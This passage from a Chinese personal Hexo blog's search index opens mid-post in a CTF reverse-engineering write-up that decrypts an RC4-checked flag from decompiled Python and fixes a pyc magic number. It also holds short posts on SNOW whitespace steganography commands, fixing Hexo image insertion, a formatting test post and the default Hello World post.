class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k_b[i]) % <span class="number">256</span></span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KeyStream</span>(<span class="params">text, Sbox</span>):</span><br><span class="line">    s = Sbox.copy()</span><br><span class="line">    (i, j) = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    k = [<span class="number">0</span>] * <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        k[r] = s[t] ^ Key.keykey[r % <span class="built_in">len</span>(Key.keykey)]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">text, seed</span>):</span><br><span class="line">    Sbox = init_Sbox(seed)</span><br><span class="line">    key = KeyStream(text, Sbox)</span><br><span class="line">    enc = (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ text[i] ^ key[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(enc)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Please input Your flag:&#x27;</span>)</span><br><span class="line">flag = (<span class="keyword">lambda</span> <span class="number">.0</span>: [ <span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(flag)</span><br><span class="line">flag = Encrypt(flag, Key.key)</span><br><span class="line"><span class="keyword">if</span> flag != enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s not flag!&quot;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;You are right!&#x27;</span>)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key = &#x27;yOU_f1nd_m3&#x27;</span></span><br><span class="line"><span class="string">keykey = [66,97,115,101]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li></ul><p>这就是很明显的RC4加密了，256次循环初始化Sbox,目的就是为了打乱数字顺序，顺序依靠key，然后再通过异或获得flag。</p><ul><li>解密脚本（仅针对本题，因为此题有两个key）</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given key and keykey</span></span><br><span class="line">key = <span class="string">&#x27;yOU_f1nd_m3&#x27;</span></span><br><span class="line">keykey = [<span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Sbox</span>(<span class="params">seed</span>):</span><br><span class="line">    k_b = [<span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k_b[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KeyStream</span>(<span class="params">text, Sbox</span>):</span><br><span class="line">    s = Sbox.copy()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        k[r] = s[t] ^ keykey[r % <span class="built_in">len</span>(keykey)]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">enc, seed</span>):</span><br><span class="line">    Sbox = init_Sbox(seed)</span><br><span class="line">    key_stream = KeyStream(enc, Sbox)</span><br><span class="line">    decrypted = [enc[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> decrypted)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given encrypted message</span></span><br><span class="line">enc = <span class="string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span></span><br><span class="line">flag = Decrypt(enc, key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="通用解密脚本"><a href="#通用解密脚本" class="headerlink" title="通用解密脚本"></a>通用解密脚本</h2><p>参考：<a class="link" href="https://www.jianshu.com/p/d9ad5fc524ec">Python3.7实现RC4加密解密（超详细） - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4解密主函数调用成功&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用解密程序成功。&quot;)</span></span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于解密字符串，解密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment"># print(&quot;解密后的字符串是：%s&quot; %cipher)</span></span><br><span class="line">    <span class="comment"># print(&quot;解密后的输出(没经过任何编码):&quot;)</span></span><br><span class="line">    <span class="keyword">return</span>  cipher</span><br><span class="line"><span class="comment"># rc4_main(&quot;123456sh&quot;, &quot;ABHCum92PMOXwqI=&quot;)</span></span><br></pre></td></tr></table></figure></div><p>加解密其实没太大区别，可以上网搜搜</p><h1 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h1><p><a class="link" href="https://www.lddgo.net/string/pyc-compile-decompile">在线网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="magic-number"><a href="#magic-number" class="headerlink" title="magic number"></a>magic number</h2><ul><li>正常的直接丢到在线网站分解发现无法分解，发现给的附件里面还有struct文件，上网查了查，发现是给的pyc文件的magic number出现错误</li><li><mark>正确的magic number在struct<mark></mark></mark></li></ul><p><img lazyload src="/images/loading.svg" data-src="/exe-pyc-RC4/capture_20241014191021381.bmp"></p><p><mark>E3前面的就是magic number<mark>,修改或者增添到给的pyc文件，再去网站解密即可。</mark></mark></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-特殊加密</title>
      <link href="/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SNOW-雪"><a href="#SNOW-雪" class="headerlink" title="SNOW(雪)"></a>SNOW(雪)</h1><ul><li>关于一种txt空白加密的方法：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../%E6%A0%B7%E4%BE%8B.bmp"></p><p>像这样子的，txt文件用winHex打开，发现文字后面大片的空白，猜测是SNOW加密。</p><ul><li><p>工具下载地址：<a class="link" href="https://darkside.com.au/snow/">The SNOW Home Page (darkside.com.au) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>使用：将要解密的txt放在同一目录下，还需要知道key，然后利用指令解密：</p><p><code>.\SNOW.EXE -p key -C .\flag.txt</code>   [解密]</p><p><code>.\SNOW.EXE -C -m &quot;message&quot; -p &quot;key&quot; infile outfile</code> [加密]</p><p>加密表示将隐藏文件infile中的message用key加密，储存在outfile中</p><p><img lazyload src="/images/loading.svg" data-src="/../%E8%A7%A3%E5%AF%86%E6%8C%87%E4%BB%A4.bmp"></p></li><li><p>详细的可参考：<a class="link" href="https://blog.csdn.net/qq_53079406/article/details/123810053">csdn-blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录解决hexo插图失败</title>
      <link href="/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><ul><li>根据网上教学搭建博客，想要插入<strong>本地图片</strong>，但是图片始终无法加载出来：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/%E5%A4%B1%E8%B4%A5%E6%A0%B7%E4%BE%8B.bmp" alt="失败样例"></p><p>类似于上面的情况，或者就一个小图案，无法加载出来。</p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><ul><li><p>按照网上说的，先修改Blog目录下的_config.yml中的<strong>post_asset_folde改为true</strong>,这个必须先该</p></li><li><p>下载插件：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install <span class="attr">https</span>:<span class="comment">//github.com/CodeFalling/hexo-asset-image --save</span></span><br></pre></td></tr></table></figure></div></li><li><p>修改Typora的图像偏好：<br><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/%E5%81%8F%E5%A5%BD%E8%AE%BE%E7%BD%AE.bmp" alt="偏好设置"></p></li></ul><p>像这样设置好，这样你在每一次hexo new XXX的时候，<strong>都会在_posts下面生成一个和.md同名的文件夹，这个文件夹就会专门来放你的图片</strong>，我们也可以，提前将图片放进去。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul><li>关于其他的插入图片方式，比如建立图床&lt;！<a href="url"></a>&gt;来引用图片，个人感觉还是比较复杂，就没有实现了，以后有时间再尝试。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 搭建博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="代码测试："><a href="#代码测试：" class="headerlink" title="代码测试："></a>代码测试：</h2><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="图片测试："><a href="#图片测试：" class="headerlink" title="图片测试："></a>图片测试：</h2><p><img lazyload src="/images/loading.svg" data-src="/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/ceshi.jpg" alt="ceshi"></p><h2 id="引用测试"><a href="#引用测试" class="headerlink" title="引用测试"></a>引用测试</h2><blockquote><p>你好,这是一条引用</p></blockquote><h2 id="链接测试"><a href="#链接测试" class="headerlink" title="链接测试"></a>链接测试</h2><ul><li>这是fastbin_attack文章链接<br> &lt;<a class="link" href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &gt;</li></ul><h2 id="无序列表测试"><a href="#无序列表测试" class="headerlink" title="无序列表测试"></a>无序列表测试</h2><ul><li>小向</li><li>小罗</li><li>大向</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/20/hello-world/"/>
      <url>/2024/08/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a class="link" href="https://hexo.io/">Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link" href="https://hexo.io/docs/">documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link" href="https://hexo.io/docs/troubleshooting.html">troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link" href="https://github.com/hexojs/hexo/issues">GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div><p>More info: <a class="link" href="https://hexo.io/docs/writing.html">Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div><p>More info: <a class="link" href="https://hexo.io/docs/server.html">Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div><p>More info: <a class="link" href="https://hexo.io/docs/generating.html">Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div><p>More info: <a class="link" href="https://hexo.io/docs/one-command-deployment.html">Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
